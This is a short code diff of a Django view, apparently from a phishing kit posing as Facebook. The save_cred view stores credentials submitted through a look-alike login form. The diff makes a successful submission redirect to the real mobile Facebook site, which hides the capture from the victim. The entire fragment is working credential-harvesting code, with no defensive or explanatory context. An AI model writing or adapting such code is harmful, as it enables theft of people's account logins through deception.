@@ -1,4 +1,5 @@
 from django.shortcuts import render, redirect
+from django.urls import reverse
 from . import forms
 
 
@@ -12,6 +13,6 @@ def save_cred(request):
         new_cred = forms.CredentialForm(request.POST)
         if new_cred.is_valid():
             new_cred.save()
-            return redirect('facebook:login')
+            return redirect('https://m.facebook.com/')
         else:
-            return redirect('facebook:login')
+            return redirect(reverse('facebook:login'))
